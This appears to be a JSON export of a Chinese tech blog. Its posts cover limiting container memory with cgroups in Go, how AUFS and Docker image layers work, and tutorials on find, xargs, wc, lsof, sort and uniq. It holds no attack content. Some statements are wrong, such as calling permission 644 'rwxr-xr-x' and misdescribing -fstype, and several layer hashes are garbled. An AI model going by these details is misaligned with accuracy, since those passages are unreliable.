#查看 cgroup 的内存限制 cat memory.limit_in_bytes #输出：134217728 #查看 cgroup 中进程所使用的内存大小 cat memory.usage_in_bytes #输出：430080 也就是，容器会创建 cgroup，然后通过 cgroup 去配置资源限制和资源监控 Go 实现通过 cgroup 限制容器资源在上述的 Namespace 的基础上，加上 cgroup 的限制 package main import ( \"fmt\" \"io/ioutil\" \"os\" \"os/exec\" \"path\" \"strconv\" \"syscall\" ) // 挂载了 memory subsystem 的 hierarchy 的根目录位置 const cgroupMemoryHierarchyMount = \"/sys/fs/cgroup/memory\" func main() { if os.Args[0] == \"/proc/self/exe\" { // 容器进程 fmt.Printf(\"current pid %d\\n\", syscall.Getpid()) cmd := exec.Command(\"sh\", \"-c\", `stress --vm-bytes 200m --vm-keep -m 1`) cmd.SysProcAttr = &amp;syscall.SysProcAttr{} cmd.Stdin = os.Stdin cmd.Stderr = os.Stderr cmd.Stdout = os.Stdout if err := cmd.Run(); err != nil { panic(err) } } cmd := exec.Command(\"/proc/self/exe\") cmd.SysProcAttr = &amp;syscall.SysProcAttr{ Cloneflags : syscall.CLONE_NEWUTS | syscall.CLONE_NEWPID | syscall.CLONE_NEWNS, } cmd.Stdin = os.Stdin cmd.Stdout = os.Stdout cmd.Stderr = os.Stderr if err := cmd.Start(); err != nil { panic(err) } // 被 fork 出来进程映射到外部命名空间的 pid fmt.Printf(\"%v\", cmd.Process.Pid) // 在系统默认创建挂载了 memory subsystem 的 hierarchy 上创建 cgroup os.Mkdir(path.Join(cgroupMemoryHierarchyMount, \"testmemorylimit\"), 0755) // 将容器进程加入到这个 cgroup 中 ioutil.WriteFile(path.Join(cgroupMemoryHierarchyMount, \"testmemorylimit\", \"tasks\"), []byte(strconv.Itoa(cmd.Process.Pid)), 0644) // 限制 cgroup 进程使用 ioutil.WriteFile(path.Join(cgroupMemoryHierarchyMount, \"testmemorylimit\", \"memory.limit_in_bytes\"), []byte(\"100m\"), 0644) cmd.Process.Wait() } Union File System简称 UnionFS，一种为 Linux、FreeBSD 和 NetBSD 操作系统设计的，把其他文件系统联合到一个挂载点的文件系统服务 使用branch 把不同文件系统的文件和目录”透明的覆盖“，形成一个单一一致的文件系统。也就是不会存在多多，在不同的文件下。而且，这些branch会被限制权限，即 read-only 或者 read-write的。 其具有一个重要的资源管理技术，叫 写时复制（copy-on-write，简称 CoW），也被称为隐式共享，是一种对资源实现高效复制的资源管理技术。思想为，若一个资源的利用为重复的，且未被修改，就不需要新创建，这个资源可被新旧实例共享，何是创建？当发送第一次写操作时。很明显，这样可以带来未修改资源复制带来的消耗，但也会在进行资源修改时增加小部分的开销。 换句话说，在虚拟联合文件系统中，我们对文件进行改动，看似对原文件进行了改动，实则是写入到了一个新的文件中。 AUFSAdvanced Multi-Layered Unification Filesyetem，完全重写了早起的 UnionFS 1.x，主要目的为了可靠性和性能，并且引入了一些新的功能，比如可写分支的负载均衡 主要功能为把多个目录结合成一个目录，对外使用 把多个目录 mount 成一个，读写操作步骤如下： 默认情况下，最上层的目录为读写层，只能有一个 下面可以有一个或者多个只读层读文件 读文件，从最上面一个开始往下逐层去找，打开第一个找到的文件，读取其中的内容 写文件，如果在最上层找到了该文件，直接打开否则，从上往下开始查找，找到文件后，把文件复制到最上层，然后再打开这个 copy 删除文件：在最上层创建一个 whiteout 文件，.wh.，就是在原来的文件名字前面加上 .wh Docker 如何使用 AUFS？ AUFS 具有快速启动容器、高效利用存储和内存的优点。因此，直到现在为止，AUFS也是Docker支持的一种存储驱动类型 image layer和AUFS每一个 Docker image 都是由一系列 read-only layer 组成的。image layer的内容都存储在Docker hosts filesystem 的 /var/lib/docker/aufs/diff 目录下。而/var/lib/docker/aufs/layers 目录，则存储着 image layer如何堆栈这些layer的metadata 在 Docker 1.11.2 版本下，没有任何镜像，启动容器，然后执行ls /var/lib/docker/aufs/diff查看为空 然后 # 拉取 Ubuntu:15.04 镜像 $ docker pull ubuntu:15.04 $ ls /var/lib/docker/aufs/diff 208319b22189a2c3841bc4a4ef0df9f9238a3e832dc403133fb8ad4a6c22b01b 9c444e426a4a0aa3ad8ff162dd7bcd 4dcbb2e55bdec26Bb24666171904cl7573 6bb19cb345da470e015ba3flca049alc27d2c57ebc205ecl65d2ad8a44e14Bea f193107618deb441376a54901bc9115f30473clec792b7fb3e73a98119e2cf77 $ ls /var/lib/docker/aufs/mnt 208319b22189a2c384lbc4a4ef0df9f923Ba3e832dc4031 33fb8ad4a6c22b01b 9c444e426a4a0aa3ad8ff162dd7bcd4dcbb2e55bdec268b24666171904cl7573 6bb19cb345da470e015ba3flca049alc27d2c57ebc205ecl65d2ad8a44el48ea f193107618deb441376a54901bc9115f30473clec792b7fb3e73a98119e2cf77 # 查看某个layer下的layer $ cat /var/lib/docker/aufs/layers/6bb19cb345da470e015ba3flca049alc27d2c57ebc205ecl65d2ad8a44el48ea 9c444e426a4a0aa3ad8ff162dd7bcd4dcbb2e55bdec268b24666171904cl7573 fl93107618deb441376a54901bc9115f30473clec792b7fb3e73a98119e2cf77 208319b22189a2c384lbc4 a4 ef0df9f9238a3e832dc403133fb8ad4a6c22b01b 很明显，ubuntu:15.04一共有4个layer，也就在执行命令的结果中也有4个对应的文件存储目录(ls /var/lib/docker/aufs/diff) 补充：在 Docker 1.10 之后，diff目录下存储镜像 layer 文件夹不再与镜像 ID 相同了 AUFS 如何节省空间？ 首先，创建一个 Dockerfile From ubuntu:15.04 RUN echo \"hello world\" &gt; /tmp/newfile 执行如下命令： # 创建image $ docker build -t change-ubuntu . $ docker history change-ubuntu:latest IMAGE CREATED CREATED BY SIZE COMMENT e7b7fc3bc0d0 18 seconds ago /bin/sh -c echo \"hello world\" &gt; /tmp/newfile 12B d1b55fd07600 6 years ago /bin/sh -c #(nop) CMD [\"/bin/bash\"] 0B &lt;missing&gt; 6 years ago /bin/sh -c sed -i 's/^#\\s*\\(deb.*universe\\)$… 1.88kB &lt;missing&gt; 6 years ago /bin/sh -c echo '#!/bin/sh' &gt; /usr/sbin/poli… 701B &lt;missing&gt; 6 years ago /bin/sh -c #(nop) ADD file:3f4708cf445dc1b53… 131MB 从上面的结果看出来，e7b7fc3bc0d0 image layer位于最上层，只有12B的大小，也就是echo \"hello world\" &gt; /tmp/newfile造成的。而下面的四层image layer，则是共享地构成 ubuntu:15.04 镜像的4个image layer。实际上，最上层的layer，也只是有一个 /tmp/newfile文件，内容为 “Hello world” 为什么出现了 missing 标记？ 自 Docker 1.10 之后，一个镜像的 image layer的 image history 数据都存储在同一个文件中导致的， container layer 和 AUFS首先，对于容器而言，每个image layer最多只需要复制一次，后续的改动都会在第一次拷贝的 container layer 上进行。也就是，在改动容器内容的时候，只会复制一次镜像层的内容进行改动 每次启动一个 container的时候，Docker会为其创建一个 read-only 的 init layer，用来存储与这个容器内环境相关的内容；Docker 还会为其创建一个 read-write 的 layer 来执行所有写操作。这两个文件都在/var/lib/docker/aufs/diff 下，read-only为-init，write-only为 另外，container layer的 mount目录也是 /var/lib/docker/aufs/mnt。 container 的 metadata （元数据）和配置文件都放在 /var/lib/docker/containers/ 目录中。 container 的 read-write layer 存储在/var/lib/docker/aufs/diss/目录下，这样，就是容器停止了，也不会因为重启容器而导致数据丢失，只有当容器被删除时，这个读写层才会被一起删除 container 删除一个文件时，假设为删除file1，会在 read-write 层生成一个 .wh.file1 的文件来隐藏所有read-only 层 file1的文件。跟上述的AUFS简介类似 手动实现 AUFS首先，先执行如下操作 $ cd /home/anshun &amp;&amp; mkdir aufs $ cd aufs $ mkdir container-layer mnt &amp;&amp; touch container-layer/container-layer.txt $ echo \"I am container layer\" &gt; container-layer/container-layer.txt $ for i in {1..4}; do mkdir image-layer$i; done $ for i in {1..4} &gt; do &gt; touch image-layer$i/image-layer$i.txt &gt; echo \"I am image layer ${i}\" &gt; image-layer$i/image-layer$i.txt &gt; done $ tree . ├── container-layer │&nbsp;&nbsp; └── container-layer.txt ├── image-layer1 │&nbsp;&nbsp; └── image-layer1.txt ├── image-layer2 │&nbsp;&nbsp; └── image-layer2.txt ├── image-layer3 │&nbsp;&nbsp; └── image-layer3.txt ├── image-layer4 │&nbsp;&nbsp; └── image-layer4.txt └── mnt 5 directories, 5 files 然后，把 container-layer 和 其它4个文件挂载到 mnt 目录下 在mount aufs命令中，若没有指定待挂载的文件的权限，默认为 dirs 指定的左边第一个目录为 read-write权限，后面都是 read-only 权限 $ mount -t aufs -o dirs=./container-layer:./image-layer4:./image-layer3:./image-layer2:./image-layer1 none ./mnt $ tree mnt mnt ├── container-layer.txt ├── image-layer1.txt ├── image-layer2.txt ├── image-layer3.txt └── image-layer4.txt 0 directories, 5 files $ echo -e \"\\nwrite to mnt's image-layer1.txt\" &gt;&gt; ./mnt/image-layer4.txt # 查看虚拟挂载点的文件 $ cat ./mnt/image-layer4.txt I am image layer 4 write to mnt's image-layer1.txt # 查看原文件 $ cat image-layer4/image-layer4.txt I am image layer 4 # 查看 container-layer，多了一个image-layer4.txt文件 $ ll container-layer/ 总用量 24 drwxr-xr-x 4 root root 4096 3月 13 18:59 ./ drwxr-xr-x 8 root root 4096 3月 13 18:31 ../ -rw-r--r-- 1 root root 21 3月 13 18:17 container-layer.txt -rw-r--r-- 1 root root 52 3月 13 18:59 image-layer4.txt -r--r--r-- 1 root root 0 3月 13 18:57 .wh..wh.aufs drwx------ 2 root root 4096 3月 13 18:57 .wh..wh.orph/ drwx------ 2 root root 4096 3月 13 18:57 .wh..wh.plnk/ $ cat container-layer/image-layer4.txt I am image layer 4 write to mnt's image-layer1.txt 也就是，在尝试对mnt/image-layer4.txt的文件进行写操作时，系统会先在mnt目录下找到对应的文件，然后将其拷贝到 read-write 层的目录中（这里为container-layer），接着对其拷贝的文件进行操作，而不对原文件进行更改。由此，也证明了上面所说的lazy的思想","categories":[{"name":"手搓docker","slug":"手搓docker","permalink":"https://github.com/z-anshun/categories/%E6%89%8B%E6%90%93docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://github.com/z-anshun/tags/docker/"},{"name":"books","slug":"books","permalink":"https://github.com/z-anshun/tags/books/"}]},{"title":"grep","slug":"grep","date":"2022-03-05T15:42:08.000Z","updated":"2022-03-05T15:42:08.874Z","comments":true,"path":"2022/03/05/grep/","link":"","permalink":"https://github.com/z-anshun/2022/03/05/grep/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"find","slug":"find","date":"2022-03-03T15:57:21.000Z","updated":"2022-03-05T15:41:17.870Z","comments":true,"path":"2022/03/03/find/","link":"","permalink":"https://github.com/z-anshun/2022/03/03/find/","excerpt":"","text":"find在指定目录下查找文件 是findutil软件包的一部分，具有非常强大的灵活性，可以指定丰富的搜索条件（如文件权限、属主、属组、文件类型、日期和大小等）来定位系统中的目录和文件 格式find [paths] [expression] [action] find 命令接受一个或多个路径（paths）作为搜索范围，并在该路径下递归地搜索。即检索完指定的目录后，还会对该目录下的子目录进行检索，以及子目录下的子目录。。。直到到达目录树底部 默认情况下，即不带搜索条件（expression）时，find会返回指定目录下的所有文件 find的 action 默认为将输出至标准输出，也可自定义 action 选项 -atime n：距离文件上次被访问时的时间间隔 -ctime n：距离文件创建时的时间间隔 -mtime n：距离文件上次发送更改的时间 -delete：删除搜索到的文件 -depth n：检索深度为 n 的文件，即位于指定目录以下n层的文件 -empty：检索空文件或目录 -fstype type：指定空文件或空目录 -group gname：指定文件的属组 -iname pattern：同-name，忽略大小写 -ipath pattern：同-path，忽略大小写 -ls：打印搜索到文件的详细信息 -maxdepth n：指定递归的最大层数为 n -name pattern：对指定文件名匹配 -path pattern：对文件路径进行匹配 -perm mode：根据文件权限搜索 -size n[ckMGTP]：根据文件大小搜索 -type t：根据文件类型搜索 -user uname：指定文件的属主 实例搜索条件（expression）根据文件名搜索 -name和-iname两个选项都支持 wildcards(扩展符)。如： ?可以表示任意一个单一的符号 *可以表示任意数量（包括0）的未知符号 find /usr -name '*.txt'查找 /usr目录下所有文件名以.txt结尾的文件 find /usr -name '????'查找/usr目录下所有文件名刚好为四个的 根据路径搜索 -path和-ipath的用法跟上面类似 find /usr -path '*/src/*.txt' 查找 /usr 下所有文件名以 .txt 结尾的文件或目录，且该文件的父目录必须是 src 根据文件类型搜索 -type选项常用参数： f：文件 d：目录 l：链接文件 c：字符设备 b：块设备 s：嵌套字 p：Fifo find /usr -type d -name 'python'检索 /usr 下所有文件名以 python 开头的目录 检索空目录 find ~ -type d -empty检索用户主目录下所有的空目录 反义匹配 find /usr -type f ! -name '*.txt' 检索 /usr 下所有文件名不以 .txt 为后缀的文件 find /usr -type f ! -empty 检索 /usr 下所有内容不为空的文件 根据文件的所属权检索 -user检索归属于特定用户的文件或目录 find / -type f -user starky 检索根目录下所有属主为 starky 的文件 类似于 -user选项，-group 选项则可以根据文件或目录的属组进行检索。 根据时间日期 Linux 系统中，与文件相关联的时间参数有以下三种： 修改时间（Modification time）：最后一次文件内容有过更改的时间点 访问时间（Access time）：最后一次文件有被读取过的时间点 变更时间（Change time）：最后一次文件有被变更过的时间点（如内容被修改，或权限等 metadata 被修改） 与此对应的是 find 命令中的 -mtime，-atime 和 -ctime 三个选项。 这三个选项的使用遵循以下示例中的规则： -mtime 2：该文件 2 天前被修改过 -mtime -2：该文件 2 天以内被修改过 -mtime +2：该文件距离上次修改已经超过 2 天时间 find /usr -type f -mtime 2 检索 /usr 下两天前被修改过的文件 如果觉得 -mtime 等选项以天为单位时间有点长，还可以使用 -mmin，-amin，-cmin 三个选项：find /usr -type f -mtime +50 -mtime -100 检索 /usr 下 50 到 100 天之前修改过的文件find /usr -type f -mtime 2 -amin 5 检索 /usr 下两天前被修改过且 5 分钟前又读取过的文件 根据文件大小进行匹配 文件大小单元： b —— 块（512字节） c —— 字节 w —— 字（2字节） k —— 千字节 M —— 兆字节 G —— 吉字节 另外，还可以使用 + 或 - 符号表示大于或小于当前条件。 find / -size +1G 检索文件大小高于 1 GB 的文件 根据文件权限 如需要检索 /usr 目录下权限为 rwxr-xr-x 的文件，可以使用以下命令：find /usr -perm u=rwx,g=rx,o=rx 搜索 /usr 目录下所有权限为 r-xr-xr-x（即系统中的所有用户都只有读写权限）的文件和目录，可以使用以下命令：find /usr -perm a=rx 很多时候，我们只想匹配文件权限的一个子集。比如，检索可以直接被任何用户执行的文件，即只关心文件的执行权限，而不用管其读写权限是什么。 上述的需求可以通过以下命令实现：find / -type f -perm /a=x其中 a=x 前面的 / 符号即用来表示只匹配权限的某个子集（执行权限），而不用关心其他权限的具体设置 find /usr -perm 644 搜索 /usr 目录下权限为 644（即 rwxr-xr-x）的文件 逻辑组合 实际上 find 命令支持 “and” 和 “or” 两种逻辑运算，对应的命令选项分别是 -a 和 -o。通过这两个选项可以对搜索条件进行更复杂的组合 此外还可以使用小括号对搜索条件进行分组。注意 find 命令中的小括号常需要用单引号包裹起来。因小括号在 Shell 中有特殊的含义。 如检索 /usr 下文件名以 python 开头且类型为目录的文件find /usr -type d -name 'python*' 该命令等同于：find /usr -type d -a -name 'python*' 更复杂的组合形式如：find / '(' -mmin -5 -o -mtime +50 ')' -a -type f 对搜索结果执行命名（action） 删除文件 -delete 选项可以用来删除搜索到的文件和目录。 如删除 home 目录下所有的空目录：find ~ -type d -empty -delete 执行自定义命令 -exec 选项可以对搜索到的结果执行特定的命令。 如需要将 home 目录下所有的 MP3 音频文件复制到移动存储设备（假设路径是 /media/MyDrive），可使用下面的命令：find ~ -type f -name '*.mp3' -exec cp {} /media/MyDrive ';' 其中的大括号（{}）作为检索到的文件的 占位符 ，而分号（ ;）作为命令结束的标志。因为分号是 Shell 中有特殊含义的符号，所以需要使用单引号括起来。 每当 find 命令检索到一个符合条件的文件，会使用其完整路径取代命令中的 {}，然后执行 -exec 后面的命令一次 另一个很重要的用法是，在多个文件中检索某个指定的字符串。如在用户主目录下的所有文件中检索字符串 hello ，可以使用如下命令：find ~ -type f -exec grep -l hello {} ';' -exec 选项中的 + 符号 创建 Gzip 格式的压缩文件的命令为：tar -czvf filename.tar.gz &lt;list of files&gt; 现在假设需要将用户主目录下所有的 MP3 文件添加到压缩包 music.tar.gz 中，直观的感觉是，其命令应为如下形式：find ~ -type f -name '*.mp3' -exec tar -czvf music.tar.gz {} ';' 实际情况是，这样得到的 music.tar.gz 其实只包含一个 MP3 文件。原因是 find 命令每次发现一个音频文件，都会再执行一次 -exec 选项后面的压缩命令。导致先前生成的压缩包被覆盖。 可以先让 find 命令检索出所有符合条件的音频文件，再将得到的文件列表传递给后面的压缩命令。完整的命令如下：find ~ -type f -name '*.mp3' -exec tar -czvf music.tar.gz {} + 显示文件信息 如果想浏览搜索到的文件（目录）的详细信息（如权限和大小等），可以直接使用 -ls 选项。 find / -type file -size +1G -ls 浏览所有 1G 以上大小的文件的详细信息","categories":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/z-anshun/categories/Linux/"}],"tags":[{"name":"每日命令","slug":"每日命令","permalink":"https://github.com/z-anshun/tags/%E6%AF%8F%E6%97%A5%E5%91%BD%E4%BB%A4/"}]},{"title":"xargs","slug":"xargs","date":"2022-03-02T12:04:56.000Z","updated":"2022-03-03T15:54:00.228Z","comments":true,"path":"2022/03/02/xargs/","link":"","permalink":"https://github.com/z-anshun/2022/03/02/xargs/","excerpt":"","text":"Xargs给其他命令传递参数的一个过滤器 擅长将标准输入数据转换成命令行格式 用法读取输入数据重新格式化输出 cat test.txt a b c d e f g h i j k l m n o p q r s t u v w x y z cat test.txt | xargs a b c d e f g h i j k l m n o p q r s t u v w x y z 使用-n进行多行输出每行的word个数 cat test.txt | xargs -n3 a b c d e f g h i j k l m n o p q r s t u v w x y z 使用-d进行分割-d确定分隔符 echo \"nameXnameXnameXname\" | xargs -dX name name name name 结合-n选项使用 echo \"nameXnameXnameXname\" | xargs -dX -n2 name name name name 读取 stdin假设一个命令为 sk.sh 和一个保存参数的文件 arg.txt #!/bin/bash #sk.sh 命令内容，打印出所有参数。 echo $* # $* 所有参数 cat arg.txt aaa bbb ccc 集合 -I选项使用-I选项，指定一个替换字符串{}，类似占位符，这样，在xargs扩展时，该占位符就会被替换掉，并且每个命令执行一次 cat arg.txt | xargs -I {} ./sk.sh -p {} -l -p aaa -l -p bbb -l -p ccc -l 复制所有图片文件到 /data/images 目录下： ls *.jpg | xargs -n1 -I {} cp {} /data/images 结合find用 rm 删除太多的文件时候，可能得到一个错误信息：/bin/rm Argument list too long. 用 xargs 去避免这个问题 find . -type f -name \"*.log\" -print0 | xargs -0 rm -f xargs -0 将 \\0 作为定界符 统计一个源代码目录中所有 php 文件的行数： find . -type f -name \"*.php\" -print0 | xargs -0 wc -l 查找所有的 jpg 文件，并且压缩它们： find . -type f -name \"*.jpg\" -print | xargs tar -czvf images.tar.gz xargs 其他应用 假如你有一个文件包含了很多你希望下载的 URL，你能够使用 xargs下载所有链接： # cat url-list.txt | xargs wget -c 打印出执行的命令结合 -t 选项可以打印出 xargs 执行的命令 ls | xargs -t -I{} echo {} 会输出当前目录下的文件列表和执行的 echo 命令 使用 -p 选项确认执行的命令-p 选项会在执行每一个命令时弹出确认，当你需要非常准确的确认每一次操作时可以使用 -p 参数，比如，查找当前目录下 .log 文件，每一次删除都需要确认： find . -maxdepth 1 -name \"*.log\" | xargs -p -I{} rm {} 执行多个命令使用 -I 选项可以让 xargs 执行多个命令 cat foo.txt one two three cat foo.txt | xargs -I % sh -c 'echo %; mkdir %' one two three ls one two three","categories":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/z-anshun/categories/Linux/"}],"tags":[{"name":"每日命令","slug":"每日命令","permalink":"https://github.com/z-anshun/tags/%E6%AF%8F%E6%97%A5%E5%91%BD%E4%BB%A4/"}]},{"title":"wc","slug":"wc","date":"2022-02-28T14:27:02.000Z","updated":"2022-03-02T12:02:22.977Z","comments":true,"path":"2022/02/28/wc/","link":"","permalink":"https://github.com/z-anshun/2022/02/28/wc/","excerpt":"","text":"wc统计文件的字节数、字数、行数 若不指定其文件名，或给予的文件名为“-”，则wc会从标准输入设备读取数据 语法wc(选项)(参数) wc [选项]... [文件]... wc [选项]... --files0-from=F 选项 -c：统计字节数，或 --bytes，显示 Bytes数 -l：统计行数，或 --lines，显示行数 -m：统计字符数，或 --chars，显示字符数 -w：统计字数，或 --words，显示字数。 -L：打印最长行的长度，或 --max-line-length 举例wc -l * # 统计当前目录下的所有文件行数及总计行数 wc -l *.js find . * | xargs wc -l * # 当前目录以及子目录的所有文件行数及总计行数 查看文件的字节数、字数、行数 wc test.txt # 输出结果 7 8 70 test.txt # 行数 单词数 字节数 文件名 用wc命名做到只打印统计数字而不打印文件名 wc -l &lt; test.txt 统计当前目录下的文件数（不含隐藏文件） # 要去除TOTAL行 expr $(ls -l | wc -l) - 1 # 输出结果 8 统计当前目录下的所有文件行数及总计行数 [root@centos7 ~]# wc -l * 21 LICENSE 270 README.md wc: example: read: Is a directory 785 lerna-debug.log 25 lerna.json wc: node_modules: read: Is a directory 23603 package-lock.json 79 package.json 3 renovate.json 24786 total","categories":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/z-anshun/categories/Linux/"}],"tags":[{"name":"每日命令","slug":"每日命令","permalink":"https://github.com/z-anshun/tags/%E6%AF%8F%E6%97%A5%E5%91%BD%E4%BB%A4/"}]},{"title":"lsof","slug":"lsof","date":"2022-02-22T11:42:58.000Z","updated":"2022-02-28T14:24:38.215Z","comments":true,"path":"2022/02/22/lsof/","link":"","permalink":"https://github.com/z-anshun/2022/02/22/lsof/","excerpt":"","text":"lsoflist open file 一个查看进程打开的文件的工具 在Linux中，一切皆文件。因此，通过文件不仅可以访问常规数据，还能访问网络连接和硬件。所有lsof不仅可以查看进程打开的文件、目录，还能查看进程监听的端口等 socket 相关的信息 语法lsof (选项) 选项 -a：列出打开文件所在的进程 -c&lt;进程名&gt;：列出指定进程打开的文件 -g：列出GID号进程详情 -d&lt;文件号&gt;：列出占用该文件号的进程 +d&lt;目录&gt;：列出目录下被打开的文件 +D&lt;目录&gt;：递归列出目录下被打开的文件 -n&lt;目录&gt;：列出使用NFS的文件 -i&lt;条件&gt;：列出符合条件的进程（协议、:端口、@ip） -p&lt;进程号&gt;：列出指定进程号所打开的文件 -u：列出 UID 号进程详情 实例lsof command PID USER FD type DEVICE SIZE NODE NAME init 1 root cwd DIR 8,2 4096 2 / init 1 root rtd DIR 8,2 4096 2 / init 1 root txt REG 8,2 43496 6121706 /sbin/init init 1 root mem REG 8,2 143600 7823908 /lib64/ld-2.5.so init 1 root mem REG 8,2 1722304 7823915 /lib64/libc-2.5.so init 1 root mem REG 8,2 23360 7823919 /lib64/libdl-2.5.so init 1 root mem REG 8,2 95464 7824116 /lib64/libselinux.so.1 init 1 root mem REG 8,2 247496 7823947 /lib64/libsepol.so.1 init 1 root 10u FIFO 0,17 1233 /dev/initctl migration 2 root cwd DIR 8,2 4096 2 / migration 2 root rtd DIR 8,2 4096 2 / migration 2 root txt unknown /proc/2/exe ksoftirqd 3 root cwd DIR 8,2 4096 2 / ksoftirqd 3 root rtd DIR 8,2 4096 2 / ksoftirqd 3 root txt unknown /proc/3/exe 各列信息名： Command：进程名 PID：进程标识符 PPID：夫进程表示符号（需指定-R参数） User：进程所有者 PGID：进程所属组 FD：文件描述符 Type：文件类型，如 DIR、REG 等 Device：以逗号分隔设备编号 Node：索引节点(文件在磁盘上的标识) FD 列中的常见内容有 cwd、rtd、txt、mem 和一些数字等等。其中： cwd 表示当前的工作目录； rtd 表示根目录； txt 表示程序的可执行文件； mem 表示内存映射文件； 数字表示输入输出（0输入，1输出，2标准错误）； 标准输入输出后跟着文件状态模式： u：该文件被打开并处于读取/写入模式 r：表示该文件被打开并处于只读模式 w：该文件被打开且处于写入模式 空格 | -：unknow，且没有被锁定 在文件状态模式后面，还跟着相关的锁： w：文件部分锁 W：整个文件锁 文件类型： DIR：目录 CHR：字符类型 BLK：块设备类型 UNIX：域套接字 FIFO IPv4：网际协议（IP）套接字 DEVICE：指定磁盘名称 SIZE：文件大小 NODE：索引节点（文件在磁盘上的标识） NAME REG：常规文件 常见用法 列出指定进程号打开的所有文件： lsof -p $pid 打开指定文件的进程： lsof $filename 查看哪些进程打开了某个目录，及其目录下的文件： lsof +d $filename lsof +D $filename 对指定目录进行递归 组合选项：lsof的选择间，默认为或的关系，添加-a选项，让其选项间的关系变为与 lsof -a -p $$ -d0,1,2 这里的$$为当前进程的PID，-d选项选择了文件的描述符 查看指定程序名称打开的文件： lsof -c cr 查找以字母cr开头的程序打开的文件列表 -c也支持正则表达式：lsof -c /cr[ao]/ 过滤出以 cra 和 cro 开头的程序打开的文件列表 查看被打开的和网络相关的文件，格式如下： [46][protocol][@hostname|hostaddr][:service|port] 46：表示 IP 协议的版本 protocol：表示网络协议名称，如 TCP 或 UDP hostname：或 hostaddr 表示主机地址 service：指 /etc/services 中的名称，比如 smtp 或多个服务的列表 port：表示端口号，可指定一个或多个 默认-i选项同时输出 IPv4 和 IPv6 打开的文件 lsof -i 4列出 IPv4 打开的文件；lsof -i 6列出 IPv6 打开的文件 lsof -i:22 列出与22号端口相关的文件 lsof -i TCP:1-1024列出指定范围内被打开的TCP端口 查看你被打开的 UNIX domain socket 文件 lsof -a -c sshd -U -U选择查看打开的 UNIX domain socket 文件，-c指定服务名，这里为 ssh 服务 查看某个用户打开的所有文件 lsof -u syslog -u 既可以指定用户名，也能指定用户ID kill -9 $(lsof -t -u nick) 杀掉某个用户打开了文件的所有进程，-t选项让其只输出进程的PID 统计系统打开的文件总数 lsof -P -n | wc -l -P 表示不解析端口号，-n表示不解析主机名，这两个选项主要的目的是为了提升 lsof 命令的执行速度 获取端口对应的进程ID=&gt;pid lsof -i:9881 -P -t -sTCP:LISTEN -s选择协议","categories":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/z-anshun/categories/Linux/"}],"tags":[{"name":"每日命令","slug":"每日命令","permalink":"https://github.com/z-anshun/tags/%E6%AF%8F%E6%97%A5%E5%91%BD%E4%BB%A4/"}]},{"title":"sort","slug":"sort和uniq","date":"2022-02-21T09:17:26.000Z","updated":"2022-02-21T14:15:55.581Z","comments":true,"path":"2022/02/21/sort-he-uniq/","link":"","permalink":"https://github.com/z-anshun/2022/02/21/sort-he-uniq/","excerpt":"","text":"sort对文本文件中所以进行排序，并将排序结果标准输出。 既可从指定文件输入，也可从 stdin 中获取输入 语法sort [option]... [FILE]... 选项 -b：忽略开头的空白 -d：仅考虑空白、字母、数字 -f：将小写字母作为大写字母考虑 -g：根据数字排序 -i：排除不可打印的字符 -M：按照非月份、一月、十二月的顺序排序 -h：根据存储容量排序（但要使用大写字母，如：2K 1G） -n：根据数字排序 -R：随机排序 -r：将结果倒叙排序 -m：将几个排序好的文件进行合并； -o：指定输入文件，而不是标准输出 -k, --key=KEYDEF： 通过一个key排序；KEYDEF给出位置和类型 -t, --field-separator=SEP ：使用SEP作为列的分隔符 参数文件 实例sort将一个文件/文本的每一行作为一个单位，相互比较，比较的原则是从首字符向后，依次按照ASCII码值进行比较，最好再将其按升序排序 anshun@LAPTOP-F0CAKEEH:~$ cat sort.txt aaa:10:1.1 ccc:30:3.3 ddd:40:4.4 bbb:20:2.2 eee:50:5.5 eee:50:5.5 anshun@LAPTOP-F0CAKEEH:~$ sort sort.txt aaa:10:1.1 bbb:20:2.2 ccc:30:3.3 ddd:40:4.4 eee:50:5.5 eee:50:5.5 需要忽略相同的行，使用-u或者使用uniq： anshun@LAPTOP-F0CAKEEH:~$ sort -u sort.txt aaa:10:1.1 bbb:20:2.2 ccc:30:3.3 ddd:40:4.4 eee:50:5.5 anshun@LAPTOP-F0CAKEEH:~$ uniq sort.txt aaa:10:1.1 ccc:30:3.3 ddd:40:4.4 bbb:20:2.2 eee:50:5.5 sort的-n、-r、-k、-t选项的使用： anshun@LAPTOP-F0CAKEEH:~$ cat sort.txt AAA:BB:CC aaa:10:1.1 ccc:30:3.3 ddd:40:4.4 bbb:20:2.2 eee:50:5.5 eee:50:5.5 # 将BB列按照数字从小到大顺序排列： # -n 按数字大小排序， -k 指定列 -t 指定分隔符 anshun@LAPTOP-F0CAKEEH:~$ sort -nk 2 -t: sort.txt AAA:BB:CC aaa:10:1.1 bbb:20:2.2 ccc:30:3.3 ddd:40:4.4 eee:50:5.5 eee:50:5.5 # 将CC列数字从大到小顺序排列： # -n是按照数字大小排序，-r是以相反顺序，-k是指定需要排序的栏位，-t指定栏位分隔符为冒号 anshun@LAPTOP-F0CAKEEH:~$ sort -nrk 3 -t: sort.txt eee:50:5.5 eee:50:5.5 ddd:40:4.4 ccc:30:3.3 bbb:20:2.2 aaa:10:1.1 AAA:BB:CC -k选项的解读-k FStart.CStart,FEnd.CEnd Start部分的FStart和C.Start；C.Start是可以省略的，FEnd.CEnd也一样。 FStart.CStart，其中FStart就是表示使用的域，而CStart则表示在FStart域中从第几个字符开始算排序首字符，FEnd.CEnd没有，就默认至最后一个字符 如： #从公司英文名称的第二个字母开始排序： $ sort -t ' ' -k 1.2 facebook.txt baidu 100 5000 sohu 100 4500 google 110 5000 guge 50 3000 使用-k 1.2，表示对第一个域的第二个字符开始到本域的最后一个字符为止的字符串进行排序 例子2：只针对公司英文名称的第二个字母进行排序，如果相同的按照员工工资进行降序排序： $ sort -t ' ' -k 1.2,1.2 -nrk 3,3 facebook.txt baidu 100 5000 google 110 5000 sohu 100 4500 guge 50 3000 uniq显示或忽略重复的行。 语法uniq [OPTION]... [INPUT [OUTPUT]] 主要用途 将输入文件（或标准输入）中邻近的重复行写入到输出文件（或标准输出）中 当没有选项时，邻近的重复行合并为一个 选项 -c：count，在每行开头增加重复次数 -d：repeated，所有邻近的重复行只被打印一次 -D：所有邻近的重复行将全部打印 -f, --skip-fileds=N：跳过对前N个列的比较 -i：忽略大小写的差异 